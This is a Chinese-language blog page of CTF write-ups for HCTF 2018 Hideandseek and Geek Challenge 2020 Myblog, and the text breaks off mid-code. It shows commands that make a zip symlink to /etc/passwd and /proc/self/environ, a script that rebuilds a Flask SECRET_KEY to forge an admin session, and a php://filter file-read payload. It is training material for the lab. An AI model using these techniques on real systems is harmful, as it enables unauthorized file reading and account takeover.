    <link href="/2021/08/07/hate/"/>
    <url>/2021/08/07/hate/</url>
    
    <content type="html"><![CDATA[<h1>[HCTF 2018]Hideandseek</h1><p>知识点：</p><ul><li><strong>zip 软链接实现任意文件读取</strong></li><li><strong>linux系统目录</strong></li><li><strong>flask session伪造</strong></li></ul><p>没有注册功能，直接登录，需要上传zip文件，随便传一个，发现他会直接读取回显：</p><p><img src="/2021/08/07/hate/5.png" alt="5"></p><p>利用点应该就是用zip去读文件。</p><h4 id="软链接读取文件"><a class="header-anchor" href="#软链接读取文件">🍭</a>软链接读取文件</h4><p>这个利用点来自脸书的一个读取漏洞。软链接又叫符号链接，用<code>ln -s</code>创建。这个链接包含了另一个文件的路径名：它可以是任意文件或目录，可以链接不同文件系统的文件。就像是是win下的快捷方式。</p><p>用法：</p><pre><code class="hljs excel"><span class="hljs-built_in">ln</span> -s 源文件 目标文件</code></pre><p>比如我们要读/etc/passwd，可以创建一个软链接：</p><pre><code class="hljs awk">ln -s <span class="hljs-regexp">/etc/</span>passwd link</code></pre><p>压缩文件，同时保留链接</p><pre><code class="hljs stata"><span class="hljs-keyword">zip</span> --symlinks <span class="hljs-keyword">test</span>.<span class="hljs-keyword">zip</span> link   #symlinks是kali/Ubuntu下维持软链接（符号链接）的命令</code></pre><p>然后上传test.zip文件，系统会自动解压缩，页面当中会返回/etc/passwd的内容。</p><h4 id="思路"><a class="header-anchor" href="#思路">🍭</a>思路</h4><p>之前在登录的时候admin回显you are not admin，观察一下session</p><p><img src="/2021/08/07/hate/6.png" alt="6"></p><p>解码：{“username”: “1”}，应该是要flask-session伪造了，猜测要用软链接读取相关文件使得可以用admin身份登录（毕竟好多题目都这样），所以接下来就是要通过软链接获取SECRET_KEY。</p><h4 id="解题"><a class="header-anchor" href="#解题">🍭</a>解题</h4><p>生成<code>/proc/self/environ</code>的软链接，压缩后上传，得到flask的环境变量，没研究出什么有用的，看了WP，里面有一个配置文件：</p><p><img src="/2021/08/07/hate/7.png" alt="7"></p><blockquote><p>uWSGI是一个Web应用服务器，它具有应用服务器，代理，进程管理及应用监控等功能。它支持WSGI协议，同时它也支持自有的uWSGI协议.</p></blockquote><p>读一下：</p><p><img src="/2021/08/07/hate/8.png" alt="8"></p><p>WP说这个题目有bug，原题源码在这个目录下：<code>/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py</code>，buu环境没弄好，只显示了main，读一下得到源码：</p><pre><code class="hljs vim"># -*- codin<span class="hljs-variable">g:</span> utf-<span class="hljs-number">8</span> -*-from flask import Flask,session,render_template,redirect, url_for, <span class="hljs-built_in">escape</span>, request,Responseimport uuidimport base64import randomimport flagfrom werkzeug.utils import secure_filenameimport osrandom.seed(uuid.getnode())app = Flask(__name__)app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = str(random.random()*<span class="hljs-number">100</span>)app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="hljs-string">&#x27;./uploads&#x27;</span>app.config[<span class="hljs-string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="hljs-number">100</span> * <span class="hljs-number">1024</span>ALLOWED_EXTENSIONS = <span class="hljs-keyword">set</span>([<span class="hljs-string">&#x27;zip&#x27;</span>])def allowed_file(filename):    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;.&#x27;</span> in filename <span class="hljs-built_in">and</span> \           filename.rsplit(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">1</span>].lower() in ALLOWED_EXTENSIONS@app.route(<span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>])def <span class="hljs-built_in">index</span>():    error = request.<span class="hljs-keyword">args</span>.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)    <span class="hljs-keyword">if</span>(error == <span class="hljs-string">&#x27;1&#x27;</span>):        session.<span class="hljs-keyword">pop</span>(<span class="hljs-string">&#x27;username&#x27;</span>, None)        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, forbidden=<span class="hljs-number">1</span>)    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;username&#x27;</span> in session:        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, user=session[<span class="hljs-string">&#x27;username&#x27;</span>], flag=flag.flag)    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)@app.route(<span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>])def login():    username=request.form[<span class="hljs-string">&#x27;username&#x27;</span>]    password=request.form[<span class="hljs-string">&#x27;password&#x27;</span>]    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span> <span class="hljs-built_in">and</span> username != <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-built_in">and</span> password != <span class="hljs-string">&#x27;&#x27;</span>:        <span class="hljs-keyword">if</span>(username == <span class="hljs-string">&#x27;admin&#x27;</span>):            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>,error=<span class="hljs-number">1</span>))        session[<span class="hljs-string">&#x27;username&#x27;</span>] = username    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))@app.route(<span class="hljs-string">&#x27;/logout&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>])def logout():    session.<span class="hljs-keyword">pop</span>(<span class="hljs-string">&#x27;username&#x27;</span>, None)    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))@app.route(<span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>])def upload_file():    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;the_file&#x27;</span> not in request.<span class="hljs-keyword">file</span><span class="hljs-variable">s:</span>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))    <span class="hljs-keyword">file</span> = request.<span class="hljs-keyword">files</span>[<span class="hljs-string">&#x27;the_file&#x27;</span>]    <span class="hljs-keyword">if</span> <span class="hljs-keyword">file</span>.filename == <span class="hljs-string">&#x27;&#x27;</span>:        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))    <span class="hljs-keyword">if</span> <span class="hljs-keyword">file</span> <span class="hljs-built_in">and</span> allowed_file(<span class="hljs-keyword">file</span>.filename):        filename = secure_filename(<span class="hljs-keyword">file</span>.filename)        file_save_path = os.path.<span class="hljs-keyword">join</span>(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)        <span class="hljs-keyword">if</span>(os.path.<span class="hljs-built_in">exists</span>(file_save_path)):            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;This file already exists&#x27;</span>        <span class="hljs-keyword">file</span>.save(file_save_path)    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;This file is not a zipfile&#x27;</span>    <span class="hljs-keyword">try</span>:        extract_path = file_save_path + <span class="hljs-string">&#x27;_&#x27;</span>        os.<span class="hljs-built_in">system</span>(<span class="hljs-string">&#x27;unzip -n &#x27;</span> + file_save_path + <span class="hljs-string">&#x27; -d &#x27;</span>+ extract_path)        read_obj = os.popen(<span class="hljs-string">&#x27;cat &#x27;</span> + extract_path + <span class="hljs-string">&#x27;/*&#x27;</span>)        <span class="hljs-keyword">file</span> = read_obj.<span class="hljs-keyword">read</span>()        read_obj.<span class="hljs-keyword">close</span>()        os.<span class="hljs-built_in">system</span>(<span class="hljs-string">&#x27;rm -rf &#x27;</span> + extract_path)    except Exception <span class="hljs-keyword">as</span> <span class="hljs-keyword">e</span>:        <span class="hljs-keyword">file</span> = None    os.<span class="hljs-built_in">remove</span>(file_save_path)    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">file</span> != None):        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">file</span>.<span class="hljs-keyword">find</span>(base64.b64decode(<span class="hljs-string">&#x27;aGN0Zg==&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)) != -<span class="hljs-number">1</span>):            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>, error=<span class="hljs-number">1</span>))    <span class="hljs-keyword">return</span> Response(<span class="hljs-keyword">file</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    #app.run(<span class="hljs-keyword">debug</span>=True)    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-keyword">debug</span>=True, port=<span class="hljs-number">10008</span>)</code></pre><p>可以看到flag在<code>/app/flag.py</code>文件里，试了一下软链接读不了，只能找<code>SECRET_KEY</code>了，源码中：</p><p><code>app.config['SECRET_KEY'] = str(random.random()*100)</code></p><p>SECRET_KEY随机生成，但给了种子：</p><p><code>random.seed(uuid.getnode())</code></p><p>之前讲过random生成的数不是真正的随机数，而是伪随机数，利用伪随机数的特性，只要种子是一样的，后面产生的随机数值也会一致。</p><p><img src="/2021/08/07/hate/9.png" alt="9"></p><p>mac地址怎么获得</p><p><img src="/2021/08/07/hate/10.png" alt="10"></p><p>读/sys/class/net/eth0/address得mac地址：02:42:ac:10:87:3d</p><p>用脚本处理</p><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> <span class="hljs-type">uuid</span><span class="hljs-keyword">import</span> randommac = &quot;02:42:ac:10:87:3d&quot;<span class="hljs-keyword">temp</span> = mac.split(<span class="hljs-string">&#x27;:&#x27;</span>)<span class="hljs-keyword">temp</span> = [<span class="hljs-type">int</span>(i,<span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-keyword">temp</span>]<span class="hljs-keyword">temp</span> = [bin(i).replace(<span class="hljs-string">&#x27;0b&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).zfill(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-keyword">temp</span>]<span class="hljs-keyword">temp</span> = <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-keyword">join</span>(<span class="hljs-keyword">temp</span>)mac = <span class="hljs-type">int</span>(<span class="hljs-keyword">temp</span>,<span class="hljs-number">2</span>)random.seed(mac)randStr = str(random.random()*<span class="hljs-number">100</span>)print(randStr) #得<span class="hljs-number">85.57286294786866</span></code></pre><p>伪造一下</p><p><img src="/2021/08/07/hate/11.png" alt="11"></p><p>替换</p><img src="/2021/08/07/hate/12.png" alt="12" style="zoom:50%;"><p>参考：<a href="https://www.freesion.com/article/14231062121/">https://www.freesion.com/article/14231062121/</a></p><h1>[极客大挑战 2020]Roamphp2-Myblog</h1><p>题目有一个登陆界面，但是尝试了一下注入不了；测试一圈发现不管访问什么界面，url都是<code>?page=xxx</code>，试一下伪协议读取源码：<code>?page=php://filter/read=convert.base64-encode/resource=login.php </code>,读取不出来，但是首页url的末尾是<code>?page=home</code>，没有后缀，试试去掉<code>.php</code>：</p><p><img src="/2021/08/07/hate/3.png" alt="3"></p><p>解码一下，login.php：</p><pre><code class="hljs php-template"><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Login<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;description&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;robots&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;all,follow&quot;</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://ajax.aspnetcdn.com/ajax/bootstrap/4.2.1/css/bootstrap.min.css&quot;</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;css/style.default.css&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;theme-stylesheet&quot;</span>&gt;</span></span><span class="xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;page login-page&quot;</span>&gt;</span></span><span class="xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container d-flex align-items-center&quot;</span>&gt;</span></span><span class="xml">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-holder has-shadow&quot;</span>&gt;</span></span><span class="xml">          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;row&quot;</span>&gt;</span></span><span class="xml">            <span class="hljs-comment">&lt;!-- Logo &amp; Information Panel--&gt;</span></span><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-lg-6&quot;</span>&gt;</span></span><span class="xml">              <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;info d-flex align-items-center&quot;</span>&gt;</span></span><span class="xml">                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;content&quot;</span>&gt;</span></span><span class="xml">                  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;logo&quot;</span>&gt;</span></span><span class="xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>欢迎登录<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><span class="xml">                  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="xml">                  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>—— 博客后台 ——<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><span class="xml">                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="xml">              <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="xml">            <span class="hljs-comment">&lt;!-- Form Panel    --&gt;</span></span><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-lg-6 bg-white&quot;</span>&gt;</span></span><span class="xml">              <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form d-flex align-items-center&quot;</span>&gt;</span></span><span class="xml">                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;content&quot;</span>&gt;</span></span><span class="xml">                  <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/?page=admin/user&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-validate&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;loginFrom&quot;</span>&gt;</span></span><span class="xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span></span><span class="xml">                      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;login-username&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">required</span> <span class="hljs-attr">data-msg</span>=<span class="hljs-string">&quot;请输入用户名&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;用户名&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-material&quot;</span>&gt;</span></span><span class="xml">                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span></span><span class="xml">                      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;login-password&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">required</span> <span class="hljs-attr">data-msg</span>=<span class="hljs-string">&quot;请输入密码&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;密码&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-material&quot;</span>&gt;</span></span><span class="xml">                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary&quot;</span>&gt;</span>登录<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><span class="xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-top: -40px;&quot;</span>&gt;</span> </span><span class="xml">                    <span class="hljs-comment">&lt;!-- &lt;input type=&quot;checkbox&quot;  id=&quot;check1&quot;/&gt;&amp;nbsp;&lt;span&gt;记住密码&lt;/span&gt;</span></span><span class="xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;check2&quot;</span>/&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>自动登录<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> --&gt;</span><span class="xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;custom-control custom-checkbox &quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;float: right;&quot;</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;custom-control-input&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;check2&quot;</span> &gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;custom-control-label&quot;</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;check2&quot;</span>&gt;</span>自动登录<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;custom-control custom-checkbox &quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;float: right;&quot;</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;custom-control-input&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;check1&quot;</span> &gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;custom-control-label&quot;</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;check1&quot;</span>&gt;</span>记住密码<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span> </span><span class="xml">                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="xml">                  <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><span class="xml">                  <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span></span><span class="xml">                  <span class="hljs-tag">&lt;<span class="hljs-name">small</span>&gt;</span>没有账号?<span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;signup&quot;</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>不给注册<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><span class="xml">                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="xml">              <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="xml">    <span class="hljs-comment">&lt;!-- JavaScript files--&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://libs.baidu.com/jquery/1.10.2/jquery.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://ajax.aspnetcdn.com/ajax/bootstrap/4.2.1/bootstrap.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;vendor/jquery-validation/jquery.validate.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-comment">&lt;!--表单验证--&gt;</span></span><span class="xml">    <span class="hljs-comment">&lt;!-- Main File--&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/front.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><span class="xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php"><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;secret.php&quot;</span>);</span><span class="php">mt_srand($secret_seed);</span><span class="php">$_SESSION[<span class="hljs-string">&#x27;password&#x27;</span>] = mt_rand();</span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><p>secret.php</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$secret_seed = mt_rand();<span class="hljs-meta">?&gt;</span></code></pre><p>暂时没发现什么，但是源码中有一个admin/user:</p><pre><code class="hljs oxygene">&lt;form <span class="hljs-function"><span class="hljs-keyword">method</span>=&quot;<span class="hljs-title">post</span>&quot; <span class="hljs-title">action</span>=&quot;/?<span class="hljs-title">page</span>=<span class="hljs-title">admin</span>/<span class="hljs-title">user</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">form</span>-<span class="hljs-title">validate</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">loginFrom</span>&quot;&gt;</span></code></pre><p>读取源码得到：</p><p>登录</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);session_start();$logined = <span class="hljs-literal">false</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<span class="hljs-keyword">if</span> ($_POST[<span class="hljs-string">&#x27;username&#x27;</span>] === <span class="hljs-string">&quot;Longlone&quot;</span> <span class="hljs-keyword">and</span> $_POST[<span class="hljs-string">&#x27;password&#x27;</span>] == $_SESSION[<span class="hljs-string">&#x27;password&#x27;</span>])&#123;  <span class="hljs-comment">// No one knows my password, including myself</span>$logined = <span class="hljs-literal">true</span>;$_SESSION[<span class="hljs-string">&#x27;status&#x27;</span>] = $logined;&#125;&#125;<span class="hljs-keyword">if</span> ($logined === <span class="hljs-literal">false</span> &amp;&amp; !<span class="hljs-keyword">isset</span>($_SESSION[<span class="hljs-string">&#x27;status&#x27;</span>]) || $_SESSION[<span class="hljs-string">&#x27;status&#x27;</span>] !== <span class="hljs-literal">true</span>)&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;username or password not correct!&#x27;);window.location.href=&#x27;index.php?page=login&#x27;;&lt;/script&gt;&quot;</span>;<span class="hljs-keyword">die</span>();&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>上传文件</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_FILES[<span class="hljs-string">&#x27;Files&#x27;</span>]) <span class="hljs-keyword">and</span> $_SESSION[<span class="hljs-string">&#x27;status&#x27;</span>] === <span class="hljs-literal">true</span>)&#123;$tmp_file = $_FILES[<span class="hljs-string">&#x27;Files&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];$tmp_path = $_FILES[<span class="hljs-string">&#x27;Files&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<span class="hljs-keyword">if</span>(($extension = pathinfo($tmp_file)[<span class="hljs-string">&#x27;extension&#x27;</span>]) != <span class="hljs-string">&quot;&quot;</span>)&#123;$allows = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;gif&#x27;</span>,<span class="hljs-string">&#x27;jpeg&#x27;</span>,<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>);<span class="hljs-keyword">if</span>(in_array($extension,$allows,<span class="hljs-literal">true</span>) <span class="hljs-keyword">and</span> in_array($_FILES[<span class="hljs-string">&#x27;Files&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>],array_map(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">$ext</span>)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;image/&#x27;</span>.$ext;&#125;,$allows),<span class="hljs-literal">true</span>))&#123;$upload_name = sha1(md5(uniqid(microtime(<span class="hljs-literal">true</span>), <span class="hljs-literal">true</span>))).<span class="hljs-string">&#x27;.&#x27;</span>.$extension;move_uploaded_file($tmp_path,<span 